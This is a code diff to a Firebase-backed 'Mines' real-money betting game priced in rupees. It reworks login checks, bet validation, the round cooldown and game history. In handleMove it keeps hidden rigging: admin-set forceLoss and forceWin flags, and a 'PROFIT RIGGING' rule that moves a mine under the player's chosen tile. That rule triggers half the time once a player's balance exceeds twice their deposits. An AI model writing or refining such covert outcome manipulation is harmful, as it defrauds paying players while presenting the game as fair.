@@ -92,7 +92,10 @@
         appId: "1:546674600784:web:4b316bb716eda5f3b7da55"
     };
 
-    firebase.initializeApp(firebaseConfig);
+    // Initialize Firebase if not already initialized
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
     const db = firebase.database();
     const auth = firebase.auth();
 
@@ -112,18 +115,24 @@
     }
     initGrid();
 
+    // Sahi Auth check aur Realtime Balance logic
     auth.onAuthStateChanged(user => {
         if(user) {
+            // User ki phone number/UID se node fetch karna
+            // Note: Aapne pehle `users/${user.uid}` use kiya tha, ensure karein 
+            // ki database mein data UID ke andar hi hai ya phone number ke.
             db.ref(`users/${user.uid}`).on('value', snap => {
                 const data = snap.val();
                 if(data) {
                     balance = data.balance || 0;
-                    userTotalDeposit = data.totalDeposit || 100; // Default 100 for safety
+                    userTotalDeposit = data.totalDeposit || 0;
                     document.getElementById("balanceDisplay").innerText = balance.toFixed(2);
                     window.rigData = data;
                 }
             });
             loadHistory(user.uid);
+        } else {
+            console.log("No user logged in");
         }
     });
 
@@ -135,16 +144,22 @@
     };
 
     window.startGame = async () => {
-        if(!auth.currentUser) return alert("Login First!");
-        if (window.lastBetTime && Date.now() - window.lastBetTime < 8000) return alert("Wait 8s between rounds!");
+        const user = auth.currentUser;
+        if(!user) return alert("Login First!");
+        
+        if (window.lastBetTime && Date.now() - window.lastBetTime < 2000) return alert("Please wait...");
 
         activeBet = parseFloat(document.getElementById("betInput").value);
-        if(activeBet < 10 || activeBet > balance) return alert("Low Balance!");
+        if(isNaN(activeBet) || activeBet < 10) return alert("Min bet ₹10");
+        if(activeBet > balance) return alert("Low Balance!");
 
         window.lastBetTime = Date.now();
-        isPlaying = true; diamondsFound = 0; mines = [];
+        isPlaying = true; 
+        diamondsFound = 0; 
+        mines = [];
         
-        await db.ref(`users/${auth.currentUser.uid}`).update({ balance: firebase.database.ServerValue.increment(-activeBet) });
+        // Deduction
+        await db.ref(`users/${user.uid}`).update({ balance: firebase.database.ServerValue.increment(-activeBet) });
 
         let mCount = (currentLvl === 'easy') ? 3 : (currentLvl === 'medium' ? 10 : 24);
         while(mines.length < mCount) {
@@ -154,7 +169,13 @@
 
         document.getElementById("startBtn").style.display = "none";
         document.getElementById("cashBtn").style.display = "block";
-        document.querySelectorAll(".slot").forEach(s => { s.className="slot"; s.innerText=""; });
+        document.querySelectorAll(".slot").forEach(s => { 
+            s.className="slot"; 
+            s.innerText=""; 
+            s.style.opacity = "1";
+        });
+        document.getElementById("multText").innerText = "1.00x";
+        document.getElementById("profitText").innerText = "₹0.00";
     };
 
     window.handleMove = async (idx) => {
@@ -165,12 +186,17 @@
         let forceLoss = window.rigData?.forceLoss || false;
         let forceWin = window.rigData?.forceWin || false;
         
-        // --- PROFIT RIGGING: 200rs BANANE MEI TIME LAGEGA ---
+        // PROFIT RIGGING
         let targetProfit = userTotalDeposit * 2;
         let slowDown = (balance > targetProfit) && (Math.random() < 0.5);
 
-        if((forceLoss || slowDown) && !mines.includes(idx)) { mines.pop(); mines.push(idx); }
-        if(forceWin && mines.includes(idx)) { mines = mines.filter(m => m !== idx); }
+        if((forceLoss || slowDown) && !mines.includes(idx)) { 
+            if(mines.length > 0) mines.pop(); 
+            mines.push(idx); 
+        }
+        if(forceWin && mines.includes(idx)) { 
+            mines = mines.filter(m => m !== idx); 
+        }
 
         if(mines.includes(idx)) {
             saveHistory(activeBet, 0, "Loss");
@@ -195,7 +221,11 @@
         if(!isPlaying || diamondsFound === 0) return;
         const mult = mTable[currentLvl][diamondsFound-1] || 1;
         const win = activeBet * mult;
-        await db.ref(`users/${auth.currentUser.uid}`).update({ balance: firebase.database.ServerValue.increment(win) });
+        
+        await db.ref(`users/${auth.currentUser.uid}`).update({ 
+            balance: firebase.database.ServerValue.increment(win) 
+        });
+        
         saveHistory(activeBet, win, "Win");
         finishGame(true);
         showModal("WINNER!", `Won: ₹${win.toFixed(2)}`, "🏆");
@@ -205,17 +235,23 @@
         isPlaying = false;
         for(let i=0; i<25; i++) {
             const s = document.getElementById("s-" + i);
-            if(mines.includes(i)) { s.innerText = "💣"; s.classList.add(won ? "revealed-bomb" : "bomb"); }
+            if(mines.includes(i)) { 
+                s.innerText = "💣"; 
+                s.classList.add(won ? "revealed-bomb" : "bomb"); 
+            }
         }
         setTimeout(() => {
             document.getElementById("startBtn").style.display = "block";
             document.getElementById("cashBtn").style.display = "none";
-        }, 2000);
+        }, 1500);
     }
 
     async function saveHistory(bet, win, status) {
+        if(!auth.currentUser) return;
         const time = new Date().toLocaleTimeString();
-        db.ref(`users/${auth.currentUser.uid}/minesHistory`).push({ bet, win, status, time, multiplier: (win/bet || 0).toFixed(2) });
+        db.ref(`users/${auth.currentUser.uid}/minesHistory`).push({ 
+            bet, win, status, time, multiplier: (win/bet || 0).toFixed(2) 
+        });
     }
 
     function loadHistory(uid) {
